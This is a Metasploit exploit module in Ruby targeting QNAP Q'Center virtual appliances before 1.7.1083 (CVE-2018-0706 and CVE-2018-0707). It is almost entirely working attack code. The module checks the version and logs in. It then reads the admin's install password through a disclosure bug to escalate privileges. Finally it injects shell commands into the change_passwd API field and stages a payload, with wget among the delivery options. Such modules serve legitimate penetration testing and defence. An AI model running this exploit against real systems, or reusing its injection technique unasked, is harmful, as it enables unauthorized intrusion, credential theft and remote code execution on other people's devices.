# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => "QNAP Q&#039;Center change_passwd Command Execution",
      &#039;Description&#039;     => %q{
        This module exploits a command injection vulnerability in the
        `change_passwd` API method within the web interface of QNAP Q&#039;Center
        virtual appliance versions prior to 1.7.1083.

        The vulnerability allows the &#039;admin&#039; privileged user account to
        execute arbitrary commands as the &#039;admin&#039; operating system user.

        Valid credentials for the &#039;admin&#039; user account are required, however,
        this module also exploits a separate password disclosure issue which
        allows any authenticated user to view the password set for the &#039;admin&#039;
        user during first install.

        This module has been tested successfully on QNAP Q&#039;Center appliance
        version 1.6.1075.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Ivan Huertas&#039;, # Discovery and PoC
          &#039;Brendan Coles&#039; # Metasploit
        ],
      &#039;References&#039;      =>
        [
          [&#039;CVE&#039;, &#039;2018-0706&#039;], # privesc
          [&#039;CVE&#039;, &#039;2018-0707&#039;], # rce
          [&#039;EDB&#039;, &#039;45015&#039;],
          [&#039;URL&#039;, &#039;https://www.coresecurity.com/advisories/qnap-qcenter-virtual-appliance-multiple-vulnerabilities&#039;],
          [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2018/Jul/45&#039;],
          [&#039;URL&#039;, &#039;https://www.securityfocus.com/archive/1/542141&#039;],
          [&#039;URL&#039;, &#039;https://www.qnap.com/en-us/security-advisory/nas-201807-10&#039;]
        ],
      &#039;Platform&#039;        => &#039;linux&#039;,
      &#039;Arch&#039;            => [ARCH_X86, ARCH_X64],
      &#039;Targets&#039;         => [[&#039;Auto&#039;, { }]],
      &#039;CmdStagerFlavor&#039; => %w[printf bourne wget],
      &#039;Privileged&#039;      => false,
      &#039;DisclosureDate&#039;  => &#039;Jul 11 2018&#039;,
      &#039;DefaultOptions&#039;  => {&#039;RPORT&#039; => 443, &#039;SSL&#039; => true},
      &#039;DefaultTarget&#039;   => 0))
    register_options [
      OptString.new(&#039;TARGETURI&#039;, [true, "Base path to Q&#039;Center", &#039;/qcenter/&#039;]),
      OptString.new(&#039;USERNAME&#039;, [true, &#039;Username for the application&#039;, &#039;admin&#039;]),
      OptString.new(&#039;PASSWORD&#039;, [true, &#039;Password for the application&#039;, &#039;admin&#039;])
    ]
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;,  [false, &#039;Override check result&#039;, false])
    ]
  end

  def check
    res = send_request_cgi &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.html&#039;)

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    unless res.code == 200 && res.body.include?("<title>Q&#039;center</title>")
      vprint_error "Target is not a QNAP Q&#039;Center appliance"
      return CheckCode::Safe
    end

    version = res.body.scan(/\.js\?_v=([\d\.]+)/).flatten.first
    if version.to_s.eql? &#039;&#039;
      vprint_error "Could not determine QNAP Q&#039;Center appliance version"
      return CheckCode::Detected
    end

    version = Gem::Version.new version
    vprint_status "Target is QNAP Q&#039;Center appliance version #{version}"

    if version >= Gem::Version.new(&#039;1.7.1083&#039;)
      return CheckCode::Safe
    end

    CheckCode::Appears
  end

  def login(user, pass)
    vars_post = {
      name:     user,
      password: Rex::Text.encode_base64(pass),
      remember: &#039;false&#039;
    }
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;/hawkeye/v1/login&#039;),
      &#039;ctype&#039;  => &#039;application/json&#039;,
      &#039;data&#039;   => vars_post.to_json
    })

    if res.nil?
      fail_with Failure::Unreachable, &#039;Connection failed&#039;
    elsif res.code == 200 && res.body.eql?(&#039;{}&#039;)
      print_good "Authenticated as user &#039;#{user}&#039; successfully"
    elsif res.code == 401 || res.body.include?(&#039;AuthException&#039;)
      fail_with Failure::NoAccess, "Invalid credentials for user &#039;#{user}&#039;"
    else
      fail_with Failure::UnexpectedReply, "Unexpected reply [#{res.code}]"
    end

    @cookie = res.get_cookies
    if @cookie.nil?
      fail_with Failure::UnexpectedReply, &#039;Failed to retrieve cookie&#039;
    end
  end

  #
  # Retrieve list of user accounts
  #
  def account
    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;/hawkeye/v1/account&#039;),
      &#039;cookie&#039; => @cookie
    })
    JSON.parse(res.body)[&#039;account&#039;]
  rescue
    print_error &#039;Could not retrieve list of users&#039;
    nil
  end

  #
  # Login to the &#039;admin&#039; privileged user account
  #
  def privesc
    print_status &#039;Retrieving admin user details ...&#039;

    admin = account.first
    if admin.blank? || admin[&#039;_id&#039;].blank? || admin[&#039;name&#039;].blank? || admin[&#039;new_password&#039;].blank?
      fail_with Failure::UnexpectedReply, &#039;Failed to retrieve admin user details&#039;
    end

    @id = admin[&#039;_id&#039;]
    @pw = Rex::Text.decode_base64 admin[&#039;new_password&#039;]
    print_good "Found admin password used during install: #{@pw}"

    login admin[&#039;name&#039;], @pw
  end

  #
  # Change password to +new+ for user with ID +id+
  #
  def change_passwd(id, old, new)
    vars_post = {
      _id: id,
      old_password: Rex::Text.encode_base64(old),
      new_password: Rex::Text.encode_base64(new),
    }
    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;/hawkeye/v1/account&#039;),
      &#039;query&#039;  => &#039;change_passwd&#039;,
      &#039;cookie&#039; => @cookie,
      &#039;ctype&#039;  => &#039;application/json&#039;,
      &#039;data&#039;   => vars_post.to_json
    }, 5)
  end

  def execute_command(cmd, _opts)
    change_passwd @id, @pw, "\";#{cmd};\""
  end

  def exploit
    unless [CheckCode::Detected, CheckCode::Appears].include? check
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    login datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]

    if datastore[&#039;USERNAME&#039;].eql? &#039;admin&#039;
      @id = @cookie.scan(/_ID=(.+?);/).flatten.first
      @pw = datastore[&#039;PASSWORD&#039;]
    else
      privesc
    end

    print_status &#039;Sending payload ...&#039;
    execute_cmdstager linemax: 10_000
  end
end

